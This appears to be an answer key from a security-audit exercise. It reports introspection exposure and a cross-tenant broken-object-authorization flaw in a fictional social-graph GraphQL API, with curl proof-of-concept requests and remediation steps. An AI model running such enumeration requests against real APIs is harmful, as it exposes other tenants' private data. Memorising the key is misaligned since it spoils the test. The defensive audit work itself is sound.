# Expected Response

## System
- Domain: Social Media / Identity Graph
- System: Horizon Social Graph API
- Example ID: GQL-0061

## Priority Findings

### Finding 1: GraphQL Introspection Enabled in Production — Schema Over-Exposure (Pattern 6.1)
**Severity:** High
**Category:** Misconfiguration

**Summary:**
Per §5.0: "GraphQL introspection is enabled in production. The schema exposes internal type names, field descriptions, and sensitive relationship paths that aid exploitation." An attacker can query `__schema` to discover `postId`, `sensitiveField`, `internalNotes`, `auditLog`, and all relationship paths before constructing targeted attacks.

---

### Finding 2: Cross-Tenant Bulk Social Post Enumeration via bulkPostLookup (Pattern 6.1 + 1.9)
**Severity:** Critical
**Category:** BOLA

**Summary:**
`bulkPostLookup` accepts arbitrary `postId` values without ownership filtering. An attacker from `tenant-0d18` retrieved social identity graph records belonging to `tenant-4b62`.

**Evidence from HAR:**
- Request: `POST https://api.horizon-social-graph.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-0d18`
- Mutation: `bulkPostLookup(ids: ["P-2061", "P-1061", "P-3061"]) { postId tenantId data { sensitiveField } }`
- Response `200 OK`; `tenantId: "tenant-4b62"`, `ownerId: "other-user-0d184b62"`, `sensitiveField: "CONFIDENTIAL-0d184b62"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-0d184b62`

## Steps to Reproduce

### Step 1 — Schema introspection (Pattern 6.1 — introspection enabled per §5.0)
```bash
curl -s -X POST https://api.horizon-social-graph.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0d18" \
  -d '{"query": "{ __schema { types { name fields { name description } } } }"}'
```
**Vulnerable:** Full schema returned including `postId`, `sensitiveField`, `internalNotes`, `bulkPostLookup`.

### Step 2 — Bulk cross-tenant social post enumeration (HAR)
```bash
curl -s -X POST https://api.horizon-social-graph.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0d18" \
  -d '{"query": "mutation { bulkPostLookup(ids: [\"P-2061\", \"P-1061\", \"P-3061\"]) { postId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** Returns `tenant-4b62` social graph records. **Secure:** FORBIDDEN.

## Remediation
1. Disable introspection in production: `introspection: false` in Apollo Server config.
2. Per-ID ownership filter in `bulkPostLookup`.
3. Resolver tenant guard on `getPost`.
4. Redis cache key includes `tenantId`.
